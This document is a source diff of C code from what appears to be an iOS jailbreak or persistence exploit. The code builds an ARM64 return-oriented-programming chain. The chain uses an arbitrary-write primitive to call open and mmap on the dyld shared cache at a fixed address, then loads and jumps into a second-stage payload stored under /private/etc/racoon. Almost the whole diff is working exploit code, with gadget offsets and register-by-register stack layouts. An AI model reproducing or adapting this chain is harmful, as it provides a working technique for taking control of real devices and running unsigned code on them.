@@ -60,12 +60,6 @@ void stage1(int fd, offset_struct_t * offsets) {
 		uint64_t slide = i*offsets->slide_value;
 		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
 		
-		char stage2_file_name[8];
-		snprintf((void*)&stage2_file_name,8,"%07d",i);
-		uint64_t stage2_file_name_int;
-		memcpy(&stage2_file_name_int,&stage2_file_name,8);
-		www64(fd,offsets,ropchain_addr+0xd0,stage2_file_name_int);
-
 		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 		uint64_t curr_ropchain_addr = ropchain_addr;
 		while (curr_gadget != NULL) {
@@ -151,88 +145,138 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 		0x1a0478cb0      ff030291       add sp, sp, 0x80
 		0x1a0478cb4      c0035fd6       ret
 
-		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
-		Path is stored at 0xb8, we can do this because we assume that the stage2 baseaddress will always have a zero byte
+		We will call open("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64", O_RDONLY);
+		Path is stored at 0x70
 
 		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY
 
-		path: (/private/etc/racoon/<func pointer>\x00):
-		0x2f707269 /pri
-		0x76617465 vate
-		0x2f657463 /etc
-		0x2f706163 /rac
-		0x6f6f6e2f oon/
-		0xXXXXXXXX <func pointer>
-		0x00
-		
-		Fingers crossed that the string will survive when we start to call funcs...
-
 	[4]:
 		Now we have fully loaded gadgets again and we will just jump back to the gadget used in [3] but ofc with other args
-		to call mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_FIXED,STAGE2_FD,0)
+		to call mmap(new_cache_addr,cache_text_seg_size,PROT_READ | PROT_EXEC,MAP_FILE | MAP_SHARED | MAP_FIXED,DYLD_CACHE_FD,0)
 		
-		This means that x26 has to be the stage2_base, x25 has to be the stage2_size, x24 has to bb PROT_READ | PROT_WRITE, x23 STAGE2_FD and x22 0
+		This means that x26 has to be the new_cache_addr, x25 has to be the cache_text_seg_size, x24 has to be PROT_READ | PROT_EXEC, x23 has to be MAP_FILE | MAP_SHARED | MAP_FIXED, x22 DYLD_CACHE_FD and x21 0
 		
 	[5]:
-		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
+		now the cache is mapped at a static address so we don't have to slid anything anymore, we still need to load stage 2 tho and that's what we are doing now
+		this will call open("/private/etc/racoon/stg2", O_RDONLY);
+
+	[6]:
+		now we need to mmap it: mmap(stage2_base,stage2_size,PROT_READ|PROT_WRITE.MAP_FIXED|MAP_PRIVATE,STAGE2_FD,0);
+	[7]:
+		now x0 will contain the mmap return value so we can just call longjmp and let that load the buffer at the start of stage 2
 	*/
+
+	union path_union {
+		char path[62];
+		struct {
+			uint64_t a;
+			uint64_t b;
+			uint64_t c;
+			uint64_t d;
+			uint64_t e;
+			uint64_t f;
+			uint64_t g;
+			uint64_t h;
+		}ints;
+	};
+	union path_union path;
+	//snprintf(&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
+	snprintf(&path.path,62,"/private/etc/racoon/cache");
+	
+
 	ROP_SETUP(offsets->stage1_ropchain);
-	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
-	ADD_GADGET();							   // 0x08		[2] x20 [3] x5/sixth arg
-	ADD_GADGET();							   // 0x10		[2] x21 [3] x6/seventh arg
-	ADD_GADGET();							   // 0x18		[2] x22 [3] x4/fifth arg 
-	ADD_GADGET();							   // 0x20		[2] x23 [3] x3/fourth arg
-	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
-	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
-	ADD_OFFSET_GADGET(0xb8);				   // 0x38		[2] x26 [3] x0/first arg
-	ADD_CODE_GADGET(offsets->open);			   // 0x40		[2] x27 [3] call gadget
-	ADD_GADGET();							   // 0x48		[2] x28 
-	ADD_CODE_GADGET(offsets->longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
-	ADD_CODE_GADGET(offsets->BEAST_GADGET);    // 0x58		[2] x30 (next gadget)
-	ADD_GADGET();							   // 0x60		[2] x29
-	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
-	ADD_GADGET();							   // 0x70		[2] weird Dx registers
-	ADD_GADGET();							   // 0x78		[2] weird Dx registers
-	ADD_GADGET();							   // 0x80		[2] weird Dx registers
-	ADD_GADGET();							   // 0x88		[2] weird Dx registers
-	ADD_GADGET();							   // 0x90		[2] weird Dx registers
-	ADD_GADGET();							   // 0x98		[2] weird Dx registers
-	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
-	ADD_GADGET();							   // 0xa8		[2] weird Dx registers
+	ADD_OFFSET_GADGET(0);								   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
+	ADD_GADGET();										   // 0x08		[2] x20 [3] x5/sixth arg
+	ADD_GADGET();										   // 0x10		[2] x21 [3] x6/seventh arg
+	ADD_GADGET();										   // 0x18		[2] x22 [3] x4/fifth arg 
+	ADD_GADGET();										   // 0x20		[2] x23 [3] x3/fourth arg
+	ADD_GADGET();										   // 0x28		[2] x24 [3] x2/third arg
+	ADD_STATIC_GADGET(O_RDONLY);						   // 0x30		[2] x25 [3] x1/second arg
+	ADD_OFFSET_GADGET(0x70);							   // 0x38		[2] x26 [3] x0/first arg
+	ADD_CODE_GADGET(offsets->open);						   // 0x40		[2] x27 [3] call gadget
+	ADD_GADGET();										   // 0x48		[2] x28 
+	ADD_CODE_GADGET(offsets->longjmp);					   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
+	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x58		[2] x30 (next gadget)
+	ADD_GADGET();										   // 0x60		[2] x29
+	ADD_OFFSET_GADGET(0xb0);							   // 0x68		[2] x2  (new stack)
+	ADD_STATIC_GADGET(path.ints.a);						   // 0x70		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.b);						   // 0x78		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.c);						   // 0x80		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.d);						   // 0x88		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.e);						   // 0x90		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.f);						   // 0x98		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.g);						   // 0xa0		[2] weird Dx registers
+	ADD_STATIC_GADGET(path.ints.h);						   // 0xa8		[2] weird Dx registers
 
-	ADD_GADGET();							   // 0xb0		[2] new stack top 
-	ADD_STATIC_GADGET(0x657461766972702f);	   // 0xb8		    		       (/private)
-	ADD_STATIC_GADGET(0x6361722f6374652f);	   // 0xc0		[3] d9             (/etc/rac)				 
-	ADD_STATIC_GADGET(0x2f6f77742f6e6f6f);	   // 0xc8		[3] d8             (oon/two/)
-	ADD_STATIC_GADGET(0x0);					   // 0xd0		[3] x28           
-	ADD_CODE_GADGET(offsets->mmap);			   // 0xd8		[3] x27 [4] call gadget
-	ADD_STATIC_GADGET(offsets->stage2_base);   // 0xe0		[3] x26 [4] x0/first arg
-	ADD_STATIC_GADGET(offsets->stage2_size);   // 0xe8		[3] x25 [4] x1/second arg
-	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0xf0		[3] x24 [4] x2/third arg
-	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) // 0xf8		[3] x23 [4] x3/fourth arg
-	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x100		[3] x22 [4] x4/fifth arg
-	ADD_GADGET();							   // 0x108		[3] x21 [4] x6/seventh arg
-	ADD_STATIC_GADGET(0);					   // 0x110		[3] x20 [4] x5/sixth arg
-	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
-	ADD_GADGET();							   // 0x120		[3] x29
-	ADD_CODE_GADGET(offsets->BEAST_GADGET);    // 0x128		[3] x30 (next gadget)
 
-	ADD_GADGET();							   // 0x130		[3] new stack top
-	ADD_GADGET();							   // 0x138		
-	ADD_GADGET();							   // 0x140		[4] d9
-	ADD_GADGET();							   // 0x148		[4] d8
-	ADD_GADGET();							   // 0x150		[4] x28
-	ADD_GADGET();							   // 0x158		[4] x27
-	ADD_GADGET();							   // 0x160		[4] x26
-	ADD_GADGET();							   // 0x168		[4] x25
-	ADD_GADGET();							   // 0x170		[4] x24
-	ADD_GADGET();							   // 0x178		[4] x23
-	ADD_GADGET();							   // 0x180		[4] x22
-	ADD_GADGET();							   // 0x188		[4] x21
-	ADD_GADGET();							   // 0x190		[4] x20
-	ADD_GADGET();							   // 0x198		[4] x19
-	ADD_GADGET();							   // 0x1a0		[4] x29
-	ADD_CODE_GADGET(offsets->longjmp);		   // 0x1a8		[4] x30 (next gadget)
+	ADD_GADGET();										   // 0xb0		[2] new stack top 
+	ADD_GADGET();										   // 0xb8
+	ADD_GADGET();										   // 0xc0		[3] d9
+	ADD_GADGET();										   // 0xc8		[3] d8
+	ADD_GADGET();										   // 0xd0		[3] x28           
+	ADD_CODE_GADGET(offsets->mmap);						   // 0xd8		[3] x27 [4] call gadget
+	ADD_STATIC_GADGET(offsets->new_cache_addr);			   // 0xe0		[3] x26 [4] x0/first arg
+	ADD_STATIC_GADGET(offsets->cache_text_seg_size);	   // 0xe8		[3] x25 [4] x1/second arg
+	ADD_STATIC_GADGET(PROT_READ | PROT_EXEC);			   // 0xf0		[3] x24 [4] x2/third arg
+	ADD_STATIC_GADGET(MAP_FILE | MAP_SHARED | MAP_FIXED);  // 0xf8		[3] x23 [4] x3/fourth arg
+	ADD_STATIC_GADGET(DYLD_CACHE_FD);					   // 0x100		[3] x22 [4] x4/fifth arg
+	ADD_GADGET();										   // 0x108		[3] x21 [4] x6/seventh arg
+	ADD_STATIC_GADGET(0);								   // 0x110		[3] x20 [4] x5/sixth arg
+	ADD_GADGET();										   // 0x118		[3] x19 [4] x7/eighth arg
+	ADD_GADGET();										   // 0x120		[3] x29
+	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		[3] x30 (next gadget)
 
-	ADD_GADGET();							   // 0x1b0		[4] new stack top
+#define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr-0x180000000+offsets->new_cache_addr)
+
+	ADD_GADGET();										   // 0x130		[3] new stack top
+	ADD_STATIC_GADGET(0x657461766972702f);	   			   // 0x138				(/private)
+	ADD_STATIC_GADGET(0x6361722f6374652f);	   			   // 0x140		[4] d9  (/etc/rac) 
+	ADD_STATIC_GADGET(0x326774732f6e6f6f);	   			   // 0x148		[4] d8  (oon/stg2)
+	ADD_STATIC_GADGET(0x0);					   			   // 0x150		[4] x28
+	ADD_UNSLID_CODE_GADGET(offsets->open);				   // 0x158		[4] x27 [5] call gadget
+	ADD_OFFSET_GADGET(0x138);							   // 0x160		[4] x26 [5] x0/first arg
+	ADD_STATIC_GADGET(O_RDONLY);						   // 0x168		[4] x25 [5] x1/second arg
+	ADD_GADGET();										   // 0x170		[4] x24 [5] x2/third arg
+	ADD_GADGET();										   // 0x178		[4] x23 [5] x3/fourth arg
+	ADD_GADGET();										   // 0x180		[4] x22 [5] x4/fifth arg
+	ADD_GADGET();										   // 0x188		[4] x21 [5] x6/seventh arg
+	ADD_GADGET();										   // 0x190		[4] x20 [5] x5/sixth arg
+	ADD_GADGET();										   // 0x198		[4] x19 [5] x7/eighth arg
+	ADD_GADGET();										   // 0x1a0		[4] x29
+	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x1a8		[4] x30 (next gadget)
+
+	ADD_GADGET();										   // 0x1b0		[4] new stack top 
+	ADD_GADGET();										   // 0x1b8
+	ADD_GADGET();										   // 0x1c0		[5] d9
+	ADD_GADGET();										   // 0x1c8		[5] d8
+	ADD_GADGET();										   // 0x1d0		[5] x28           
+	ADD_UNSLID_CODE_GADGET(offsets->mmap);				   // 0x1d8		[5] x27 [6] call gadget
+	ADD_STATIC_GADGET(offsets->stage2_base);			   // 0x1e0		[5] x26 [6] x0/first arg
+	ADD_STATIC_GADGET(offsets->stage2_size);			   // 0x1e8		[5] x25 [6] x1/second arg
+	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE);			   // 0x1f0		[5] x24 [6] x2/third arg
+	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE);			   // 0x1f8		[5] x23 [6] x3/fourth arg
+	ADD_STATIC_GADGET(STAGE2_FD);						   // 0x200		[5] x22 [6] x4/fifth arg
+	ADD_GADGET();										   // 0x208		[5] x21 [6] x6/seventh arg
+	ADD_STATIC_GADGET(0);								   // 0x210		[5] x20 [6] x5/sixth arg
+	ADD_GADGET();										   // 0x218		[5] x19 [6] x7/eighth arg
+	ADD_GADGET();										   // 0x220		[5] x29
+	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x228		[5] x30 (next gadget)
+
+	
+	ADD_GADGET();										   // 0x230		[5] new stack top 
+	ADD_GADGET();										   // 0x238
+	ADD_GADGET();										   // 0x240		[6] d9
+	ADD_GADGET();										   // 0x248		[6] d8
+	ADD_GADGET();										   // 0x250		[6] x28
+	ADD_GADGET();										   // 0x258		[6] x27
+	ADD_GADGET();										   // 0x260		[6] x26
+	ADD_GADGET();										   // 0x268		[6] x25
+	ADD_GADGET();										   // 0x270		[6] x24
+	ADD_GADGET();										   // 0x278		[6] x23
+	ADD_GADGET();										   // 0x280		[6] x22
+	ADD_GADGET();										   // 0x288		[6] x21
+	ADD_GADGET();										   // 0x290		[6] x20
+	ADD_GADGET();										   // 0x298		[6] x19
+	ADD_GADGET();										   // 0x2a0		[6] x29
+	ADD_UNSLID_CODE_GADGET(offsets->longjmp);			   // 0x2a8		[6] x30 (next gadget)
 }
